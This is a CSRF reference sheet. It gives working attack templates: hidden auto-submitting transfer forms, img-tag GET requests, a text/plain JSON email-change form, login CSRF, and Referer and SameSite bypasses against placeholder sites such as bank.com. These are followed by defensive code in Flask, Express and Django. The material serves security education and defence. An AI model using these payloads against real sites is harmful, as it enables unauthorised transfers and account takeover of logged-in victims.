Cross-Site Request Forgery (CSRF)

OWASP A01 Broken Access Control · CWE-352 · Force authenticated users to perform actions they didn't intend

CSRF exploits the browser's automatic cookie behaviour: when you visit a page, the browser sends all relevant cookies with every request — including session cookies for other sites. An attacker's page can silently trigger state-changing requests on any other site the victim is logged into, authenticated by the victim's own session cookie.

① Classic GET CSRF — simplestHigh

If a state-changing action is on a GET endpoint, a single img tag is enough. No form, no JavaScript required.

<!-- On evil.com — victim's browser loads this image --> <img src="https://bank.com/transfer?to=attacker&amount=10000" width="0" height="0"/> <!-- Other zero-click vectors --> <link rel="stylesheet" href="https://bank.com/logout"> <script src="https://bank.com/admin/delete?id=1"></script> <!-- Note: GET requests should NEVER change state (REST principle) -->
② Auto-submit POST formHigh

A hidden form on the attacker's page auto-submits on page load. The browser attaches the victim's cookies automatically.

<html> <body onload="document.getElementById('f').submit()"> <form id="f" action="https://bank.com/transfer" method="POST"> <input type="hidden" name="to" value="attacker_account"/> <input type="hidden" name="amount" value="10000"/> </form> </body> </html> <!-- Delivery: send link to evil.com/csrf.html via email/chat --> <!-- Victim clicks, page loads, form submits in milliseconds -->
③ JSON CSRF (Content-Type bypass)Medium

APIs expecting JSON can still be CSRF'd if they also accept text/plain or application/x-www-form-urlencoded, or if CORS is too permissive.

<!-- Method 1: form with enctype=text/plain (no preflight) --> <form action="https://api.target.com/user/email" method="POST" enctype="text/plain"> <!-- Crafted so the form value looks like JSON --> <input name='{"email":"attacker@evil.com","x":"' value='"}'/> </form> <!-- Sends: {"email":"attacker@evil.com","x":"="} --> <!-- Method 2: fetch with CORS credentials (if CORS allows) --> fetch("https://target.com/api/email", { method: "POST", credentials: "include", // sends cookies headers: {"Content-Type": "application/json"}, body: JSON.stringify({email: "attacker@evil.com"}) }) <!-- Only works if server responds with Access-Control-Allow-Origin: * --> <!-- or explicitly allows evil.com origin + credentials -->
④ Login CSRF — force victim into attacker's accountTricky

CSRF on the login form forces the victim to log into the attacker's account. If the victim then enters sensitive data (payment info, addresses), the attacker can later log in and steal it.

<!-- Force victim to log in as attacker --> <form id="f" action="https://target.com/login" method="POST"> <input type="hidden" name="username" value="attacker@evil.com"/> <input type="hidden" name="password" value="attacker_password"/> </form> <script>document.getElementById('f').submit()</script> <!-- Scenario: victim is on shopping site, not yet logged in --> <!-- CSRF logs them into attacker's account --> <!-- Victim adds shipping address, saves credit card --> <!-- Attacker logs in and steals the saved data -->

CSRF tokens are the standard defense — but weak implementations are routinely bypassed.

① Token not validated server-side

The most common bypass: the token is present in the form, but the server never actually checks it. Submit the request without the token at all — if the server accepts it, there's no real protection.

## Test: remove the CSRF token from the request POST /transfer HTTP/1.1 Cookie: session=abc123 Content-Type: application/x-www-form-urlencoded to=attacker&amount=10000 # Remove csrf_token entirely — if server accepts → no real protection
② Token not tied to session — any valid token works

Some implementations validate that the token is valid, but don't check that it belongs to the requesting session. Use your own account's CSRF token in the forged request.

## Log into your own account → get your own CSRF token ## Use your valid CSRF token in the forged request against the victim POST /transfer HTTP/1.1 Cookie: session=VICTIM_SESSION ← victim's session csrf_token=ATTACKER_VALID_TOKEN ← attacker's own valid token ## Server checks: "is this a valid token?" → yes ## Server does NOT check: "does this token belong to this session?" → never asked
③ Token in URL — leaked via Referer

If the CSRF token is in the URL (GET parameter) rather than a hidden form field, it's logged in server logs and leaked in the Referer header to third-party scripts.

## Token in URL — bad practice https://target.com/transfer?csrf_token=abc123&to=... ## Leaked via Referer to any third-party script on the page: Referer: https://target.com/transfer?csrf_token=abc123&to=... # Scripts from analytics.js, ads.js etc all see this Referer
④ Referer header check bypass

Apps that check the Referer header instead of a token are bypassed by suppressing the Referer or by placing the target domain in the URL path.

## Suppress Referer using meta tag (older browsers) <meta name="referrer" content="no-referrer"/> <!-- Referer header not sent → server sees blank → may accept blank --> ## Place victim domain in attacker URL path (some regex bypasses) https://evil.com/https://bank.com/login # Naive check: Referer.includes("bank.com") → true! ## Host victim domain as subdomain of attacker domain https://bank.com.evil.com/csrf # Naive check: Referer.startsWith("bank.com") → true!
⑤ SameSite=Lax bypass — top-level GET navigation

SameSite=Lax blocks cross-site POST but allows GET requests from top-level navigations (links, redirects). If the endpoint accepts GET for state changes — still vulnerable.

## SameSite=Lax allows cookies on: # ✓ Top-level GET navigation (clicking a link) # ✗ Cross-site POST (form submission) # ✗ Cross-site iframes # ✗ Cross-site img/script tags ## Bypass: if endpoint accepts GET <a href="https://bank.com/transfer?to=attacker&amount=1000">Win a prize!</a> ## Or: use window.open for top-level navigation window.open("https://bank.com/transfer?to=attacker&amount=1000")

SameSite is a cookie attribute that controls when browsers send cookies on cross-site requests. Understanding its three values is essential for both exploiting and defending against CSRF.

The Chrome 120-second Lax grace period

Chrome applies Lax-by-default to cookies that don't specify SameSite — but with a 120-second grace period after the cookie is set, during which cross-site POST requests still send the cookie. This is to avoid breaking OAuth flows.

## During the first 120 seconds after a session cookie is set: ## Cross-site POST requests still include the cookie (Lax is not enforced) ## Attack: force victim to log in (login CSRF) — fresh session cookie ## Then immediately trigger the CSRF POST within 120 seconds ## The Lax grace period means the POST goes through with the session cookie ## Mitigation: don't rely on SameSite=Lax alone for sensitive actions ## Always combine with a CSRF token for banking/admin operations
① Synchronizer token pattern — the gold standard Primary defense
Generate a random, unpredictable token server-side, store it in the user's session, embed it in every state-changing form, and validate it on every submission.
## Python / Flask from flask import session import secrets # Generate on page load @app.before_request def set_csrf_token(): if 'csrf_token' not in session: session['csrf_token'] = secrets.token_hex(32) # Embed in form (Jinja2 template) # <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}"> # Validate on POST @app.route('/transfer', methods=['POST']) def transfer(): if request.form.get('csrf_token') != session.get('csrf_token'): abort(403, "CSRF token mismatch") # ... process transfer ## Node.js / Express — use csurf middleware const csrf = require('csurf'); app.use(csrf({ cookie: true })); // Token available as req.csrfToken() // Validated automatically on state-changing requests
② SameSite=Strict on session cookies Strong defense
Set on the session cookie to prevent it being sent on any cross-site request. Strongest protection but with UX tradeoff — external links to your site land users in logged-out state.
## Set-Cookie with SameSite=Strict Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Strict ## Node.js / Express res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'strict' // or 'lax' for balance }); ## Django SESSION_COOKIE_SAMESITE = 'Strict' # or 'Lax' SESSION_COOKIE_HTTPONLY = True SESSION_COOKIE_SECURE = True ## For most applications: use SameSite=Lax AND a CSRF token together ## SameSite=Lax alone is not sufficient for banking/admin actions
③ Double submit cookie pattern Stateless alternative
Set a random CSRF token in a cookie AND require it to be submitted in the request body/header. An attacker can't read the cookie (same-origin restriction), so they can't replicate it.
## Server sets cookie: Set-Cookie: csrf_token=random_value; SameSite=Strict; Secure ## Client reads cookie (JS) and adds as header: const token = document.cookie.match(/csrf_token=([^;]+)/)[1]; fetch('/api/transfer', { method: 'POST', headers: { 'X-CSRF-Token': token }, credentials: 'include' }); ## Server validates cookie value === header value ## An attacker from evil.com can't read bank.com's cookies → can't replicate
④ Verify Origin / Referer header Secondary check
Check the Origin header (preferred — always set by browsers on POST) or Referer as a secondary defense. Use exact matching — never substring.
## Check Origin header (set by browsers on POST, PUT, DELETE) allowed_origins = {'https://app.mysite.com', 'https://mysite.com'} origin = request.headers.get('Origin') if origin not in allowed_origins: abort(403) ## NEVER use substring matching: # BAD: if 'mysite.com' in origin → bypassed by mysite.com.evil.com # GOOD: if origin == 'https://mysite.com'
⑤ Framework built-in CSRF protection
Django: CsrfViewMiddleware on by default — use {% csrf_token %} in forms  ·  Rails: protect_from_forgery on by default  ·  Laravel: VerifyCsrfToken middleware included  ·  Spring: CSRF enabled by default in Spring Security  ·  Never disable these for convenience — they exist for a reason
